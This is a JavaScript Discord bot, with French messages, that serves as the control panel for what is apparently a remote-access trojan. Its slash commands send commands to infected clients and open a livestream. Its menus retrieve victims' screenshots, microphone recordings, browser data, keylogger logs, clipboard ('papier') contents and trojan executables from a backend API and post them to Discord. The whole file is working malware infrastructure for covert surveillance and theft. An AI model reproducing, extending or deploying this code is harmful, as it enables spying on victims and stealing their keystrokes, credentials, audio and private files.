import {
    Client,
    GatewayIntentBits
} from 'discord.js';

import config from './static/config.json' assert {type: 'json'};

import { fetchDataAndUpdateInteraction, handleFileResponse } from "./utils/data.js";
import { refreshTokenIfNeeded } from "./utils/token.js";
import {
    handleClientsCommand,
    handleHelpCommand,
    handleListDataCommand,
    handleSendCommand,
    handleLivestreamCommand
} from "./utils/handleCommands.js";

const { TOKEN, API_BASE_URL } = config;

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on('ready', async () => {
    console.log(`Connecté en tant que ${client.user.tag}!`);
    await refreshTokenIfNeeded();
    client.user.setActivity('/help');
});

client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        switch (interaction.commandName) {
            case 'help':
                await handleHelpCommand(interaction);
                break;
            case 'command':
                await handleSendCommand(interaction);
                break;
            case 'listdata':
                await handleListDataCommand(interaction);
                break;
            case 'livestream':
                await handleLivestreamCommand(interaction);
                break;
            case 'clients':
                await handleClientsCommand(interaction);
                break;
        }
    } else if (interaction.isButton()) {
        const [type, clientId, browser] = interaction.customId.split('_');
        await fetchDataAndUpdateInteraction(type, interaction, clientId, browser);
    } else if (interaction.customId === "select_screenshot") {
        const screenshotId = interaction.values[0];
        const endpoint = `${API_BASE_URL}/screenshot/image/${screenshotId}`;
        const fileName = "screenshot.png";
        await handleFileResponse(interaction, endpoint, fileName, "", 'image');
    } else if (interaction.customId === "select_microphone") {
        const microphoneId = interaction.values[0];
        const endpoint = `${API_BASE_URL}/microphone/audio/${microphoneId}`;
        const fileName = `audio_${microphoneId}.wav`;
        await handleFileResponse(interaction, endpoint, fileName, "Voici l'enregistrement audio :", 'audio');
    } else if (interaction.customId === "select_browserdata") {
        const [browserDataId, filename] = interaction.values[0].split('_');
        const endpoint = `${API_BASE_URL}/browser/data/${browserDataId}`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
    } else if (interaction.customId === "select_keylogger") {
        const keyloggerDataId = interaction.values[0];
        const endpoint = `${API_BASE_URL}/keylogger/log/${keyloggerDataId}`;
        const filename = `keylogger_${keyloggerDataId}.txt`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
    } else if (interaction.customId === "select_papier") {
        const papierDataId = interaction.values[0];
        const endpoint = `${API_BASE_URL}/papier/papier/${papierDataId}`;
        const filename = `papier_${papierDataId}.txt`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
    } else if (interaction.customId === "select_trojan") {
        const trojanDataId = interaction.values[0];
        const endpoint = `${API_BASE_URL}/trojan/trojan/${trojanDataId}`;
        const filename = `trojan_${trojanDataId}.exe`;
        await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');

    }

});

client.login(TOKEN).then(r => console.log("Bot démarré avec succès !"));